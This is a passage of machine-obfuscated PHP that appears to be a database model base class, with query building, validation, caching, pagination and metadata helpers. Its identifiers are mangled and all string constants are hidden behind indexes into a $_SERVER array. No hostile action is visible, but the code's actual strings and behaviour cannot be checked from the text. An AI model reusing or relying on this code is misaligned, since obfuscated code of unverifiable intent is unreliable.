$ĞÈÎşú¸[408]: if (is_string($‹®‘èŒ’[0]) && strpos($‹®‘èŒ’[0], $ĞÈÎşú¸[50])) { $‹®‘èŒ’[0] = explode($ĞÈÎşú¸[50], $‹®‘èŒ’[0]); } $’¼ì²Ø‰ = array(); if (is_array($‹®‘èŒ’[0])) { foreach ($‹®‘èŒ’[0] as $ÑÉ£îàç) { $’¼ì²Ø‰[$ÑÉ£îàç] = $İìÌ¬íŠ[$ÑÉ£îàç]; } } else { $’¼ì²Ø‰[$‹®‘èŒ’[0]] = $İìÌ¬íŠ[$‹®‘èŒ’[0]]; } if (!empty($İìÌ¬íŠ[$this->getPk()])) { $’¼ì²Ø‰[$this->getPk()] = array($ĞÈÎşú¸[409], $İìÌ¬íŠ[$this->getPk()]); } if ($this->where($’¼ì²Ø‰)->find()) { return !1; } return !0; default: return $this->check($İìÌ¬íŠ[$‹®‘èŒ’[0]], $‹®‘èŒ’[1], $‹®‘èŒ’[4]); } } public function check($¤ğìÍŠ, $¬¸Ä‹Â¡, $¨ÅğŸòæ = "\162\x65\x67\x65\170") { $–´×ŸÔó =& $_SERVER[¼¥ÊĞÙÌ]; $¨ÅğŸòæ = strtolower(trim($¨ÅğŸòæ)); switch ($¨ÅğŸòæ) { case $–´×ŸÔó[7]: case $–´×ŸÔó[410]: $Ò°ŒÀŸù = is_array($¬¸Ä‹Â¡) ? $¬¸Ä‹Â¡ : explode($–´×ŸÔó[50], $¬¸Ä‹Â¡); return $¨ÅğŸòæ == $–´×ŸÔó[7] ? in_array($¤ğìÍŠ, $Ò°ŒÀŸù) : !in_array($¤ğìÍŠ, $Ò°ŒÀŸù); case $–´×ŸÔó[411]: case $–´×ŸÔó[412]: if (is_array($¬¸Ä‹Â¡)) { $¼çœá = $¬¸Ä‹Â¡[0]; $ˆ¦À›À = $¬¸Ä‹Â¡[1]; } else { list($¼çœá, $ˆ¦À›À) = explode($–´×ŸÔó[50], $¬¸Ä‹Â¡); } return $¨ÅğŸòæ == $–´×ŸÔó[411] ? $¤ğìÍŠ >= $¼çœá && $¤ğìÍŠ <= $ˆ¦À›À : $¤ğìÍŠ < $¼çœá || $¤ğìÍŠ > $ˆ¦À›À; case $–´×ŸÔó[413]: case $–´×ŸÔó[414]: return $¨ÅğŸòæ == $–´×ŸÔó[413] ? $¤ğìÍŠ == $¬¸Ä‹Â¡ : $¤ğìÍŠ != $¬¸Ä‹Â¡; case $–´×ŸÔó[415]: $ĞÒÃƒ• = mb_strlen($¤ğìÍŠ, $–´×ŸÔó[416]); if (strpos($¬¸Ä‹Â¡, $–´×ŸÔó[50])) { list($¼çœá, $ˆ¦À›À) = explode($–´×ŸÔó[50], $¬¸Ä‹Â¡); return $ĞÒÃƒ• >= $¼çœá && $ĞÒÃƒ• <= $ˆ¦À›À; } else { return $ĞÒÃƒ• == $¬¸Ä‹Â¡; } case $–´×ŸÔó[417]: list($•éû²ëû, $‰âÃÔóô) = explode($–´×ŸÔó[50], $¬¸Ä‹Â¡); if (!is_numeric($•éû²ëû)) { $•éû²ëû = strtotime($•éû²ëû); } if (!is_numeric($‰âÃÔóô)) { $‰âÃÔóô = strtotime($‰âÃÔóô); } return NOW_TIME >= $•éû²ëû && NOW_TIME <= $‰âÃÔóô; case $–´×ŸÔó[418]: return in_array(get_client_ip(), explode($–´×ŸÔó[50], $¬¸Ä‹Â¡)); case $–´×ŸÔó[419]: return !in_array(get_client_ip(), explode($–´×ŸÔó[50], $¬¸Ä‹Â¡)); case $–´×ŸÔó[406]: default: return $this->regex($¤ğìÍŠ, $¬¸Ä‹Â¡); } } public function query($¿é™é£…, $ü£­ä®± = false) { $¢ÂÁ¢é =& $_SERVER[¼¥ÊĞÙÌ]; if (!is_bool($ü£­ä®±) && !is_array($ü£­ä®±)) { $ü£­ä®± = func_get_args(); array_shift($ü£­ä®±); } $¿é™é£… = str_replace(array($¢ÂÁ¢é[288], $¢ÂÁ¢é[420]), $¢ÂÁ¢é[53], $¿é™é£…); $¿é™é£… = $this->parseSql($¿é™é£…, $ü£­ä®±); return $this->db->query($¿é™é£…); } public function execute($…¢Í±Éè, $ßìµƒÙÌ = false) { if (!is_bool($ßìµƒÙÌ) && !is_array($ßìµƒÙÌ)) { $ßìµƒÙÌ = func_get_args(); array_shift($ßìµƒÙÌ); } $…¢Í±Éè = $this->parseSql($…¢Í±Éè, $ßìµƒÙÌ); return $this->db->execute($…¢Í±Éè); } protected function parseSql($Æã§Ïç, $©Âıã½Æ) { $â¦·ñ–Ä =& $_SERVER[¼¥ÊĞÙÌ]; if (!0 === $©Âıã½Æ) { $‚ô¾à‘Í = $this->_parseOptions(); $Æã§Ïç = $this->db->parseSql($Æã§Ïç, $‚ô¾à‘Í); } elseif (is_array($©Âıã½Æ)) { $©Âıã½Æ = array_map(array($this->db, $â¦·ñ–Ä[421]), $©Âıã½Æ); $Æã§Ïç = vsprintf($Æã§Ïç, $©Âıã½Æ); } else { $Æã§Ïç = strtr($Æã§Ïç, array($â¦·ñ–Ä[422] => $this->getTableName(), $â¦·ñ–Ä[423] => think_config($â¦·ñ–Ä[324]))); } $this->db->setModel($this->name); return $Æã§Ïç; } public function db($Ô»°Ö¨Û = '', $İµıÏç„ = '', $¨ŸĞĞ¾‚ = array()) { $·ØÓıë =& $_SERVER[¼¥ÊĞÙÌ]; if ($·ØÓıë[12] === $Ô»°Ö¨Û && $this->db) { return $this->db; } static $­ˆ•ĞÔ = array(); static $‡ËÑ¨ÈÂ = array(); if (!isset($‡ËÑ¨ÈÂ[$Ô»°Ö¨Û]) || isset($‡ËÑ¨ÈÂ[$Ô»°Ö¨Û]) && $İµıÏç„ && $­ˆ•ĞÔ[$Ô»°Ö¨Û] != $İµıÏç„) { if (!empty($İµıÏç„) && is_string($İµıÏç„) && !1 === strpos($İµıÏç„, $·ØÓıë[8])) { $İµıÏç„ = think_config($İµıÏç„); } $Ô»°Ö¨Û = think_guid($İµıÏç„); $‡ËÑ¨ÈÂ[$Ô»°Ö¨Û] = Db::getInstance($İµıÏç„); } elseif (NULL === $İµıÏç„) { $‡ËÑ¨ÈÂ[$Ô»°Ö¨Û]->close(); unset($‡ËÑ¨ÈÂ[$Ô»°Ö¨Û]); return; } if (!empty($¨ŸĞĞ¾‚)) { if (is_string($¨ŸĞĞ¾‚)) { parse_str($¨ŸĞĞ¾‚, $¨ŸĞĞ¾‚); } foreach ($¨ŸĞĞ¾‚ as $ğòæƒáÈ => $±»®ìˆò) { $this->setProperty($ğòæƒáÈ, $±»®ìˆò); } } $­ˆ•ĞÔ[$Ô»°Ö¨Û] = $İµıÏç„; $this->db = $‡ËÑ¨ÈÂ[$Ô»°Ö¨Û]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $êåÉ‹ = get_class($this); if ($êåÉ‹ == $_SERVER[¼¥ÊĞÙÌ][424]) { return $this->name; } $this->name = substr($êåÉ‹, 0, -5); } return $this->name; } public function getTableName() { $¨‘ıÏêÙ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($this->trueTableName)) { $™óêºÅ¢ = !empty($this->tablePrefix) ? $this->tablePrefix : $¨‘ıÏêÙ[12]; if (!empty($this->tableName)) { $™óêºÅ¢ .= $this->tableName; } else { $™óêºÅ¢ .= think_parse_name($this->name); } $this->trueTableName = strtolower($™óêºÅ¢); } return (!empty($this->dbName) ? $this->dbName . $¨‘ıÏêÙ[10] : $¨‘ıÏêÙ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ÿö·ç§’ =& $_SERVER[¼¥ÊĞÙÌ]; return isset($this->fields[$Ÿö·ç§’[331]]) ? $this->fields[$Ÿö·ç§’[331]] : $this->pk; } public function getDbFields() { $§ºŒ”Î =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($this->options[$§ºŒ”Î[359]])) { $«Ğ×‘•” = $this->db->getFields($this->options[$§ºŒ”Î[359]]); return $«Ğ×‘•” ? array_keys($«Ğ×‘•”) : !1; } if ($this->fields) { $«Ğ×‘•” = $this->fields; unset($«Ğ×‘•”[$§ºŒ”Î[330]], $«Ğ×‘•”[$§ºŒ”Î[331]], $«Ğ×‘•”[$§ºŒ”Î[332]], $«Ğ×‘•”[$§ºŒ”Î[329]]); return $«Ğ×‘•”; } return !1; } public function data($ª×Ğ’«× = '') { $ğÒ®“ê =& $_SERVER[¼¥ÊĞÙÌ]; if ($ğÒ®“ê[12] === $ª×Ğ’«× && !empty($this->data)) { return $this->data; } if (is_object($ª×Ğ’«×)) { $ª×Ğ’«× = get_object_vars($ª×Ğ’«×); } elseif (is_string($ª×Ğ’«×)) { parse_str($ª×Ğ’«×, $ª×Ğ’«×); } elseif (!is_array($ª×Ğ’«×)) { think_exception(think_lang($ğÒ®“ê[351])); } $this->data = $ª×Ğ’«×; return $this; } public function join($ÚÏ©Øû÷) { $‘ĞŞëİá =& $_SERVER[¼¥ÊĞÙÌ]; if (is_array($ÚÏ©Øû÷)) { $this->options[$‘ĞŞëİá[362]] = $ÚÏ©Øû÷; } elseif (!empty($ÚÏ©Øû÷)) { $this->options[$‘ĞŞëİá[362]][] = $ÚÏ©Øû÷; } return $this; } public function union($²şøâÂù, $ÊôòÇóã = false) { $ñƒêª“ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($²şøâÂù)) { return $this; } if ($ÊôòÇóã) { $this->options[$ñƒêª“[425]][$ñƒêª“[426]] = !0; } if (is_object($²şøâÂù)) { $²şøâÂù = get_object_vars($²şøâÂù); } if (is_string($²şøâÂù)) { $¤ìÔœ£“ = $²şøâÂù; } elseif (is_array($²şøâÂù)) { if (isset($²şøâÂù[0])) { $this->options[$ñƒêª“[425]] = array_merge($this->options[$ñƒêª“[425]], $²şøâÂù); return $this; } else { $¤ìÔœ£“ = $²şøâÂù; } } else { think_exception(think_lang($ñƒêª“[351])); } $this->options[$ñƒêª“[425]][] = $¤ìÔœ£“; return $this; } public function cache($½Û»Üì† = true, $ÏĞÃŸÈ = null, $„©»şâ = '') { $‹ó¯¥ =& $_SERVER[¼¥ÊĞÙÌ]; if (!1 !== $½Û»Üì†) { $this->options[$‹ó¯¥[427]] = array($‹ó¯¥[97] => $½Û»Üì†, $‹ó¯¥[417] => $ÏĞÃŸÈ, $‹ó¯¥[33] => $„©»şâ); } return $this; } public function field($¸ş¨Öó, $’¸ÄíºÚ = false) { $íñğŠÃÅ =& $_SERVER[¼¥ÊĞÙÌ]; if (!0 === $¸ş¨Öó) { $ğÏöê†š = $this->getDbFields(); $¸ş¨Öó = $ğÏöê†š ? $ğÏöê†š : $íñğŠÃÅ[223]; } elseif ($’¸ÄíºÚ) { if (is_string($¸ş¨Öó)) { $¸ş¨Öó = explode($íñğŠÃÅ[50], $¸ş¨Öó); } $ğÏöê†š = $this->getDbFields(); $¸ş¨Öó = $ğÏöê†š ? array_diff($ğÏöê†š, $¸ş¨Öó) : $¸ş¨Öó; } $this->options[$íñğŠÃÅ[353]] = $¸ş¨Öó; return $this; } public function scope($±”£®©è = '', $İ€ÌË¤¢ = NULL) { $§«¿³Î =& $_SERVER[¼¥ÊĞÙÌ]; if ($§«¿³Î[12] === $±”£®©è) { if (isset($this->_scope[$§«¿³Î[37]])) { $·Ì²Œåù = $this->_scope[$§«¿³Î[37]]; } else { return $this; } } elseif (is_string($±”£®©è)) { $£Ù“ĞÙ€ = explode($§«¿³Î[50], $±”£®©è); $·Ì²Œåù = array(); foreach ($£Ù“ĞÙ€ as $‡Ä¯ª«) { if (!isset($this->_scope[$‡Ä¯ª«])) { continue; } $·Ì²Œåù = array_merge($·Ì²Œåù, $this->_scope[$‡Ä¯ª«]); } if (!empty($İ€ÌË¤¢) && is_array($İ€ÌË¤¢)) { $·Ì²Œåù = array_merge($·Ì²Œåù, $İ€ÌË¤¢); } } elseif (is_array($±”£®©è)) { $·Ì²Œåù = $±”£®©è; } if (is_array($·Ì²Œåù) && !empty($·Ì²Œåù)) { $this->options = array_merge($this->options, array_change_key_case($·Ì²Œåù)); } return $this; } public function where($‘Š¸êä¯, $Õ‘ã‚ïÃ = null) { $ôÎºƒ„ =& $_SERVER[¼¥ÊĞÙÌ]; if (!is_null($Õ‘ã‚ïÃ) && is_string($‘Š¸êä¯)) { if (!is_array($Õ‘ã‚ïÃ)) { $Õ‘ã‚ïÃ = func_get_args(); array_shift($Õ‘ã‚ïÃ); } $Õ‘ã‚ïÃ = array_map(array($this->db, $ôÎºƒ„[421]), $Õ‘ã‚ïÃ); $‘Š¸êä¯ = vsprintf($‘Š¸êä¯, $Õ‘ã‚ïÃ); } elseif (is_object($‘Š¸êä¯)) { $‘Š¸êä¯ = get_object_vars($‘Š¸êä¯); } elseif (is_array($‘Š¸êä¯)) { foreach ($‘Š¸êä¯ as $ì½¸®¢ => $¸÷ÎŠœ) { if ((is_numeric($ì½¸®¢) || !$ì½¸®¢) && is_string($¸÷ÎŠœ)) { if (strpos($¸÷ÎŠœ, $ôÎºƒ„[428]) === 0) { continue; } think_trace($ôÎºƒ„[429], $ôÎºƒ„[12], $ôÎºƒ„[49]); die; } } } if (is_string($‘Š¸êä¯) && $ôÎºƒ„[12] != $‘Š¸êä¯) { $ä¡º¼¢ = array(); $ä¡º¼¢[$ôÎºƒ„[430]] = $‘Š¸êä¯; $‘Š¸êä¯ = $ä¡º¼¢; } if (isset($this->options[$ôÎºƒ„[355]])) { $this->options[$ôÎºƒ„[355]] = array_merge($this->options[$ôÎºƒ„[355]], $‘Š¸êä¯); } else { $this->options[$ôÎºƒ„[355]] = $‘Š¸êä¯; } return $this; } public function limit($Ó¬ãÂÃ¨, $ìÚºº„« = null) { $¥ÜÛ¯îÈ =& $_SERVER[¼¥ÊĞÙÌ]; $this->options[$¥ÜÛ¯îÈ[370]] = is_null($ìÚºº„«) ? $Ó¬ãÂÃ¨ : $Ó¬ãÂÃ¨ . $¥ÜÛ¯îÈ[50] . $ìÚºº„«; return $this; } public function page($È÷·¦û±, $É™ïµ› = null) { $öŞ¥ûğ¼ =& $_SERVER[¼¥ÊĞÙÌ]; $this->options[$öŞ¥ûğ¼[431]] = is_null($É™ïµ›) ? $È÷·¦û± : $È÷·¦û± . $öŞ¥ûğ¼[50] . $É™ïµ›; return $this; } public function comment($À òé¹«) { $this->options[$_SERVER[¼¥ÊĞÙÌ][432]] = $À òé¹«; return $this; } public function setProperty($È‰Íí“Ô, $ï¶Ş´ºù) { if (property_exists($this, $È‰Íí“Ô)) { $this->{$È‰Íí“Ô} = $ï¶Ş´ºù; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\x54\x69\x6d\x65", "\164\151\x6d\145", "\151\x6e\163\x65\x72\x74\54\x75\160\x64\x61\164\145", "\146\165\156\x63\x74\x69\x6f\156"), array("\143\x72\145\x61\164\145\x54\151\155\145", "\164\x69\x6d\x65", "\151\156\163\x65\162\x74", "\x66\x75\156\x63\x74\151\157\x6e")); public function setDataAuto($‚É›ÎÙ˜) { $this->dataAuto = $‚É›ÎÙ˜; } public function __construct($ŒÎÖàóÉ = '', $ÙİòâÖ£ = '', $¢ôŞóÎÕ = '') { parent::__construct($ŒÎÖàóÉ, $ÙİòâÖ£, $¢ôŞóÎÕ); } protected $tableMeta = array(); protected function _beforeInsert(&$å˜Ë ¾È, $‘ÀöÉ´ƒ) { $¾°£»‡ß =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->checkDataAutoHas($¾°£»‡ß[433])) { return; } $this->dataBeforeFilter($å˜Ë ¾È, $¾°£»‡ß[433]); } protected function _beforeUpdate(&$µ¬¤ûÇÕ, $™²“ÈÚÇ) { $¤Î¹Ëãô =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->checkDataAutoHas($¤Î¹Ëãô[434])) { return; } $this->dataBeforeFilter($µ¬¤ûÇÕ, $¤Î¹Ëãô[434]); } protected function _afterSelect(&$÷ŒÃØ, $õîÛ•Ôé) { if (!is_array($÷ŒÃØ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼¥ÊĞÙÌ][435])) { return; } foreach ($÷ŒÃØ as &$ìåÖ¼çî) { $this->dataAfterFilter($ìåÖ¼çî); } unset($ìåÖ¼çî); } protected function _afterFind(&$¢âÌÇÜÈ, $ù©’ÑøÃ) { if (!is_array($¢âÌÇÜÈ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¼¥ÊĞÙÌ][435])) { return; } $this->dataAfterFilter($¢âÌÇÜÈ); } public static function textEncode($¸‰´™ğ) { if (!$¸‰´™ğ) { return $¸‰´™ğ; } $‡³Èµêİ = json_encode($¸‰´™ğ); $‡³Èµêİ = preg_replace_callback($_SERVER[¼¥ÊĞÙÌ][436], function ($€Äß½¨ã) { return addslashes($€Äß½¨ã[0]); }, $‡³Èµêİ); return json_decode($‡³Èµêİ); } public static function textDecode($èê†şÀ¶) { $Ğúù…¦¿ =& $_SERVER[¼¥ÊĞÙÌ]; $¦–ò±İ = json_encode($èê†şÀ¶); $¦–ò±İ = preg_replace_callback($Ğúù…¦¿[437], function ($œ€­·‰ì) { return $_SERVER[¼¥ÊĞÙÌ][100]; }, $¦–ò±İ); return json_decode($¦–ò±İ); } public function setAutoIncrement($…úò†í») { $¦±€ä¾ = array($this->getPk() => $…úò†í»); $˜¹“®£ = $this->data($¦±€ä¾)->add(); if ($˜¹“®£) { $this->delete($˜¹“®£); } } public function getAutoIncrement() { $úÅ§Œ·² = $this->getTableName(); $¦×Øº = $this->max($this->getPk()); $ÙÒ¢¶´• = $this->query("\x73\x68\157\x77\x20\x74\141\142\154\145\40\x73\164\x61\x74\x75\x73\x20\167\150\145\162\145\x20\x4e\141\x6d\145\x3d\x27{$úÅ§Œ·²}\47"); $³÷Ä×Ûè = $ÙÒ¢¶´•[0][$_SERVER[¼¥ÊĞÙÌ][438]]; $¶ÒÙ›§ = max($¦×Øº, $³÷Ä×Ûè); return $¶ÒÙ›§; } protected function _callBefore($„Äïä«®, $ŠØĞõşå) { return $this->cacheCallCheck($„Äïä«®, $ŠØĞõşå, !1); } protected function _callAfter($¼¾ø÷Î¸, $å‹ŠºÍ†) { return $this->cacheCallCheck($¼¾ø÷Î¸, $å‹ŠºÍ†, !0); } protected function cacheFunctionAlias($…§„Ó¥æ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($®èì‹º†, $‡Şç€œî, $Ïì®É† = false) { $ç€õöóç =& $_SERVER[¼¥ÊĞÙÌ]; $†ØåÍƒ = $this->cacheFunctionAlias($‡Şç€œî); if (!$†ØåÍƒ) { return; } foreach ($†ØåÍƒ as $Öá¤·ªí => $¬€ñı¼) { $åŒÖ‘§ø = $¬€ñı¼[0]; $š üÓˆÛ = explode($ç€õöóç[50], $¬€ñı¼[1]); $†ä¬¢«ı = isset($¬€ñı¼[2]) ? $¬€ñı¼[2] : $ç€õöóç[12]; if ($®èì‹º† == $Öá¤·ªí) { return $this->cacheFunctionGet($Öá¤·ªí, $åŒÖ‘§ø, $†ä¬¢«ı); } if ($Ïì®É† && in_array($®èì‹º†, $š üÓˆÛ)) { $this->cacheFunctionClear($Öá¤·ªí, $åŒÖ‘§ø, $†ä¬¢«ı); } } } public function cacheFunctionGet($åòå¥·, $¹î–Š‹, $÷„èÀ¤ = '') { $â‘Œúİ¶ = $this->cacheKeyMake($åòå¥·, $¹î–Š‹, $÷„èÀ¤); $ô¯¾–¬ä = Cache::get($â‘Œúİ¶); if (!is_array($ô¯¾–¬ä)) { $ô¯¾–¬ä = call_user_func_array(array($this, $åòå¥·), array($¹î–Š‹, !0)); Cache::set($â‘Œúİ¶, $ô¯¾–¬ä); } return $ô¯¾–¬ä; } public function cacheFunctionClear($®üËğºô, $¥÷ «ŠÛ, $Ñãâº‰ = '') { $Ã¡¼à®ª = $¥÷ «ŠÛ; if (!is_array($¥÷ «ŠÛ)) { $Ã¡¼à®ª = array($¥÷ «ŠÛ); } foreach ($Ã¡¼à®ª as $˜ñ‚ı‘Ë) { $æıÏüš¡ = $this->cacheKeyMake($®üËğºô, $˜ñ‚ı‘Ë, $Ñãâº‰); Cache::remove($æıÏüš¡); } } public function cacheKeyMake($ŸÌØˆã, $˜üùáØ, $›öˆÏŸÏ) { $¿˜ææ½ =& $_SERVER[¼¥ÊĞÙÌ]; if ($›öˆÏŸÏ) { $˜üùáØ = $˜üùáØ . $¿˜ææ½[439] . $›öˆÏŸÏ; } return get_class($this) . $¿˜ææ½[11] . $ŸÌØˆã . $¿˜ææ½[440] . $˜üùáØ; } protected function selectPageReset() { $‡Ù·«¬¯ =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($GLOBALS[$‡Ù·«¬¯[441]])) { return; } $GLOBALS[$‡Ù·«¬¯[441]] = isset($GLOBALS[$‡Ù·«¬¯[7]][$‡Ù·«¬¯[442]]) ? $GLOBALS[$‡Ù·«¬¯[7]][$‡Ù·«¬¯[442]] : !1; $GLOBALS[$‡Ù·«¬¯[443]] = isset($GLOBALS[$‡Ù·«¬¯[7]][$‡Ù·«¬¯[431]]) ? $GLOBALS[$‡Ù·«¬¯[7]][$‡Ù·«¬¯[431]] : !1; $GLOBALS[$‡Ù·«¬¯[7]][$‡Ù·«¬¯[442]] = !1; $GLOBALS[$‡Ù·«¬¯[7]][$‡Ù·«¬¯[431]] = !1; } protected function selectPageRestore() { $ËĞØîëç =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($GLOBALS[$ËĞØîëç[441]])) { return; } $GLOBALS[$ËĞØîëç[7]][$ËĞØîëç[442]] = $GLOBALS[$ËĞØîëç[441]]; $GLOBALS[$ËĞØîëç[7]][$ËĞØîëç[431]] = $GLOBALS[$ËĞØîëç[443]]; if ($GLOBALS[$ËĞØîëç[7]][$ËĞØîëç[442]] === !1) { unset($GLOBALS[$ËĞØîëç[7]][$ËĞØîëç[442]]); } if ($GLOBALS[$ËĞØîëç[7]][$ËĞØîëç[431]] === !1) { unset($GLOBALS[$ËĞØîëç[7]][$ËĞØîëç[431]]); } unset($GLOBALS[$ËĞØîëç[441]]); unset($GLOBALS[$ËĞØîëç[443]]); } protected function selectPage($Šûï…ïò = 200, $²Æ‰Éº× = 1) { $šüÈ‘‹Æ =& $_SERVER[¼¥ÊĞÙÌ]; global $in; $˜Ò¶ € = $this->optionsValue(); $ßâÚÄ”‹ = 50000; $Šûï…ïò = isset($in[$šüÈ‘‹Æ[442]]) && $in[$šüÈ‘‹Æ[442]] ? $in[$šüÈ‘‹Æ[442]] : $Šûï…ïò; if ($Šûï…ïò === -1) { $in[$šüÈ‘‹Æ[442]] = !1; $ßâÚÄ”‹ = 100000000; $Šûï…ïò = $ßâÚÄ”‹; } $æµ¡Áğ = $˜Ò¶ €; $æµ¡Áğ[$šüÈ‘‹Æ[444]] = array(); $Šûï…ïò = intval($Šûï…ïò); $Šûï…ïò = $Šûï…ïò <= 5 ? 5 : ($Šûï…ïò >= $ßâÚÄ”‹ ? $ßâÚÄ”‹ : $Šûï…ïò); $²Æ‰Éº× = intval(isset($in[$šüÈ‘‹Æ[431]]) && $in[$šüÈ‘‹Æ[431]] ? $in[$šüÈ‘‹Æ[431]] : $²Æ‰Éº×); $²Æ‰Éº× = $²Æ‰Éº× <= 1 ? 1 : $²Æ‰Éº×; $‡˜¦ñÖœ = array(); $Ñ¾ã›«Ê = 1; if ($²Æ‰Éº× == 1 && $Ñ¾ã›«Ê) { $this->optionsValue($˜Ò¶ €); $‡˜¦ñÖœ = $this->page($²Æ‰Éº×, $Šûï…ïò)->select(); $ Ä—Ó¤× = is_array($‡˜¦ñÖœ) ? count($‡˜¦ñÖœ) : 0; if ($ Ä—Ó¤× < $Šûï…ïò) { $ï®çèé¦ = 1; } else { $this->optionsValue($æµ¡Áğ); $ Ä—Ó¤× = intval($this->count()); $ï®çèé¦ = ceil($ Ä—Ó¤× / $Šûï…ïò); } } else { $this->optionsValue($æµ¡Áğ); $ Ä—Ó¤× = intval($this->count()); $ï®çèé¦ = ceil($ Ä—Ó¤× / $Šûï…ïò); $²Æ‰Éº× = $²Æ‰Éº× >= $ï®çèé¦ ? $ï®çèé¦ : $²Æ‰Éº×; $this->optionsValue($˜Ò¶ €); $‡˜¦ñÖœ = $this->page($²Æ‰Éº×, $Šûï…ïò)->select(); } if (!is_array($‡˜¦ñÖœ)) { $‡˜¦ñÖœ = array(); } if ($ï®çèé¦ == 1) { $ Ä—Ó¤× = count($‡˜¦ñÖœ); } $ñ÷Ô³ë = array($šüÈ‘‹Æ[445] => array($šüÈ‘‹Æ[446] => $ Ä—Ó¤×, $šüÈ‘‹Æ[442] => $Šûï…ïò, $šüÈ‘‹Æ[431] => $²Æ‰Éº×, $šüÈ‘‹Æ[447] => $ï®çèé¦), $šüÈ‘‹Æ[448] => $‡˜¦ñÖœ); return $ñ÷Ô³ë; } protected function checkLength($Š÷Ü€Ü, $ßà‡µ­İ = 0, $Ğı€×Àı = '') { $ßÚ¸²ó =& $_SERVER[¼¥ÊĞÙÌ]; $ßà‡µ­İ = $ßà‡µ­İ ? $ßà‡µ­İ : 65536; if (!$Š÷Ü€Ü || strlen($Š÷Ü€Ü) < $ßà‡µ­İ) { return; } $Ğı€×Àı = $Ğı€×Àı ? $Ğı€×Àı . $ßÚ¸²ó[74] : $ßÚ¸²ó[12]; show_json($Ğı€×Àı . LNG($ßÚ¸²ó[449]) . "\50{$ßà‡µ­İ}\x29", !1); } protected function metaSet($Ìˆ­šÃú, $è­ªƒêã = null, $³³±ñ–£ = null) { $·ƒÔ¯ò =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->tableMeta || !$Ìˆ­šÃú) { return !1; } $ù­ŸÕÆÁ = $this->tableMeta[$·ƒÔ¯ò[450]]; $ü„¼Ÿà’ = $this->tableMeta[$·ƒÔ¯ò[451]]; $¿ú•ıóÍ = Model($ü„¼Ÿà’); $šÈÊ—‡‰ = array($ù­ŸÕÆÁ => $Ìˆ­šÃú, $·ƒÔ¯ò[452] => $è­ªƒêã); if (is_null($è­ªƒêã)) { return $¿ú•ıóÍ->where(array($ù­ŸÕÆÁ => $Ìˆ­šÃú))->delete(); } if (is_null($³³±ñ–£) && is_string($è­ªƒêã)) { return $¿ú•ıóÍ->where($šÈÊ—‡‰)->delete(); } $Ö¤Êëˆè = is_array($è­ªƒêã) ? $è­ªƒêã : array(); if (is_string($è­ªƒêã)) { $Ö¤Êëˆè[$è­ªƒêã] = $³³±ñ–£; } $ÛôşŒğ = array(); foreach ($Ö¤Êëˆè as $Şí‰È“ => $†¹ÇÄ»‡) { if (is_null($†¹ÇÄ»‡) && is_string($Şí‰È“)) { $¿ú•ıóÍ->where(array($ù­ŸÕÆÁ => $Ìˆ­šÃú, $·ƒÔ¯ò[452] => $Şí‰È“))->delete(); continue; } $this->checkLength($†¹ÇÄ»‡, !1, $ü„¼Ÿà’ . $·ƒÔ¯ò[4] . $Şí‰È“); $ÛôşŒğ[] = array($ù­ŸÕÆÁ => $Ìˆ­šÃú, $·ƒÔ¯ò[97] => $Şí‰È“, $·ƒÔ¯ò[453] => $†¹ÇÄ»‡); } $´óÄ› = $·ƒÔ¯ò[454] . $ü„¼Ÿà’; CacheLock::lock($´óÄ›); $¿ú•ıóÍ->where(array($ù­ŸÕÆÁ => $Ìˆ­šÃú))->addAll($ÛôşŒğ, array(), !0); CacheLock::unlock($´óÄ›); return !0; } public function metaGet($Ã“Ó¥†©, $š ¼–€± = false) { $•åëãºÊ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->tableMeta) { return array(); } $Ïİ„ùŸÚ = $this->tableMeta[$•åëãºÊ[450]]; $ÚŸ™ùú = Model($this->tableMeta[$•åëãºÊ[451]]); if ($š ¼–€±) { $ø©—Üäë = array($Ïİ„ùŸÚ => $Ã“Ó¥†©, $•åëãºÊ[97] => $š ¼–€±); return $ÚŸ™ùú->where($ø©—Üäë)->getField($•åëãºÊ[453]); } $ø©—Üäë = array($Ïİ„ùŸÚ => $Ã“Ó¥†©); $ÎÑ»Åò = $ÚŸ™ùú->field($•åëãºÊ[455])->where($ø©—Üäë)->select(); $ÎÑ»Åò = array_to_keyvalue($ÎÑ»Åò, $•åëãºÊ[97], $•åëãºÊ[453]); return $ÎÑ»Åò; } private function checkDataAutoHas($­ıäºş) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ˆ«É¾šû) { if (in_array($­ıäºş, explode($_SERVER[¼¥ÊĞÙÌ][50], $ˆ«É¾šû[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¥·ò²Ë­, $Ä‡û¹ŞÆ) { $êÂ•®©„ =& $_SERVER[¼¥ÊĞÙÌ]; if (!is_array($¥·ò²Ë­)) { return; } foreach ($this->dataAuto as $£ş‰­à’) { $Ä’¸¹Æ = $£ş‰­à’[0]; if (!in_array($Ä‡û¹ŞÆ, explode($êÂ•®©„[50], $£ş‰­à’[2]))) { continue; } switch (trim($£ş‰­à’[3])) { case $êÂ•®©„[399]: case $êÂ•®©„[400]: $îùñèğ¡ = $£ş‰­à’[1]; $’úØÏğ‘ = isset($£ş‰­à’[4]) ? (array) $£ş‰­à’[4] : array(); if ($îùñèğ¡ == $êÂ•®©„[207] && array_key_exists($Ä’¸¹Æ, $¥·ò²Ë­)) { if 